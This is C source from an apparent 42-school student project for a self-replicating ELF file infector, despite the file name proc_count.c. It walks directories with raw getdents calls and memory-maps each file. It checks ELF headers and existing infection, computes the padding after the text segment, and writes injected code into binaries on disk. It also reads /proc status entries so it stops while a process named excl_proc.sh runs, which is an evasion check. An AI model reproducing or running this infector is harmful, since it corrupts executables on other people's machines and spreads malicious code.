/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   proc_count.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/08/03 16:45:55 by fcadet            #+#    #+#             */
/*   Updated: 2022/08/05 12:34:22 by fcadet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <sys/syscall.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <elf.h>

#define	BUFF_SZ		1024
#define EXCL_PROC	"excl_proc.sh"

int		map_file(uint8_t *path);
int		test_elf_hdr(void);
int		check_infection(void);
int		find_txt_seg(void);
int		set_x_pad(void);
void	update_mem(void);
void	write_mem(uint8_t *path);
int		str_n_cmp(char *s1, char *s2, int n);
void	get_full_path(char *s1, char *s2, uint8_t *buff);

typedef struct		s_hdrs {
	Elf64_Ehdr		*elf;
	Elf64_Phdr		*txt;
	Elf64_Phdr		*nxt;
}					t_hdrs;

typedef struct		s_sizes {
	uint64_t	mem;
	uint64_t	code;
	uint64_t	data;
	uint64_t	load;
	uint64_t	f_pad;
	uint64_t	m_pad;
}					t_sizes;

typedef struct		s_buffs {
	uint8_t		path[BUFF_SZ];
	uint8_t		copy[BUFF_SZ];
	uint8_t		zeros[BUFF_SZ];
	uint8_t		entry[BUFF_SZ];
}					t_buffs;

t_sizes			sz = { 0 };
t_buffs			buffs = { 0 };
t_hdrs			hdrs = { 0 };
uint8_t			*mem = NULL;

char	*get_name(char *line, uint64_t size) {
	uint64_t		i;

	for (; size && *line != '\t'; ++line, --size);
	for (; size && *line == '\t'; ++line, --size);
	for (i = 0; i < size; ++i) {
		if (line[i] == '\n') {
			line[i] = '\0';
			break;
		}
	}
	return (i == size ? NULL : line);
}

static int		proc_entries(uint8_t *ent_ptr, char *root_path) {
	get_full_path(root_path, (char *)(ent_ptr + 18), buffs.path);
	if (map_file(buffs.path) < 0)
		return (0);
	hdrs.elf = (Elf64_Ehdr *)mem;
	if (!test_elf_hdr() && !find_txt_seg() && !check_infection()) {
		sz.f_pad = hdrs.nxt->p_offset - (hdrs.txt->p_offset + hdrs.txt->p_filesz);
		sz.m_pad = hdrs.nxt->p_vaddr - (hdrs.txt->p_vaddr + hdrs.txt->p_memsz);
		if (!set_x_pad()) {
			update_mem();
			write_mem(buffs.path);
		}
	}
	munmap(mem, sz.mem);
	return (0);
}

static int		proc_pids(uint8_t *ent_ptr, char *root_path) {
	uint8_t		buff[BUFF_SZ];
	int			status;
	int64_t		read_ret;
	char		*name;

	get_full_path(root_path, (char *)(ent_ptr + 18), buff);
	get_full_path((char *)buff, "/status", buff);
	if ((status = open((char *)buff, O_RDONLY)) < 0)
		return (0);
	if ((read_ret = read(status, buff, BUFF_SZ)) < 1
			|| !(name = get_name((char *)buff, read_ret))
			|| str_n_cmp(name, EXCL_PROC, 12)) {
		close(status);
		return (0);
	}
	close(status);
	return (-1);
}

static int		proc_dir(char *dir, int (*fn)(uint8_t *, char *)) {
	int				dir_fd;
	int64_t			dir_ret;
	uint16_t		ent_sz;
	uint8_t			*ent_ptr;
	uint8_t			buff[BUFF_SZ];

	if ((dir_fd = open(dir, O_RDONLY | O_DIRECTORY)) < 0)
		return (0);
	while ((dir_ret = syscall(SYS_getdents, dir_fd, buff, BUFF_SZ)) > 0) {
		for (ent_ptr = buff; dir_ret; ent_sz = *(uint16_t *)(ent_ptr + 16), 
				dir_ret -= ent_sz, ent_ptr += ent_sz) {
			if (fn(ent_ptr, dir)) {
				close(dir_fd);
				return (-1);
			}
		}
	}
	close(dir_fd);
	return (0);
}
